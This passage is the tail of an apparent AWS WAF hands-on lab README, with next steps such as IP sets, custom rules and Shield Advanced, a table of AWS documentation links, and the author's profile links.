4. **Implement IP Set** for allow/block lists
5. **Add Custom Rules** for application-specific patterns
6. **Enable AWS Shield Advanced** for enhanced DDoS protection

---

## AWS Documentation References

| Topic | Link |
|-------|------|
| AWS WAF Developer Guide | [Documentation](https://docs.aws.amazon.com/waf/latest/developerguide/) |
| AWS Managed Rules | [Rule Groups](https://docs.aws.amazon.com/waf/latest/developerguide/aws-managed-rule-groups.html) |
| WAF + CloudFront | [Integration Guide](https://docs.aws.amazon.com/waf/latest/developerguide/cloudfront-features.html) |
| Rate-Based Rules | [Documentation](https://docs.aws.amazon.com/waf/latest/developerguide/waf-rule-statement-type-rate-based.html) |
| WAF Pricing | [Pricing Page](https://aws.amazon.com/waf/pricing/) |
| AWS Shield | [DDoS Protection](https://aws.amazon.com/shield/) |

---

## Author

**Shashank Chinchli** — ex-AWS Solutions Architect & Golden Jacket Holder

[![GitHub](https://img.shields.io/badge/GitHub-schinchli-black?logo=github)](https://github.com/schinchli)
[![LinkedIn](https://img.shields.io/badge/LinkedIn-shashankk-blue?logo=linkedin)](https://www.linkedin.com/in/shashankk/)
[![Credly](https://img.shields.io/badge/Credly-Badges-orange?logo=credly)](https://www.credly.com/users/shashank-chinchli/badges)
[![Topmate](https://img.shields.io/badge/Topmate-1:1_Mentoring-blueviolet)](https://topmate.io/heyshashank)

---

**Build real AWS skills. Think like a Solutions Architect. Engineer like it runs in production.**

*Security Engineering on AWS - Hands-on Lab Series*
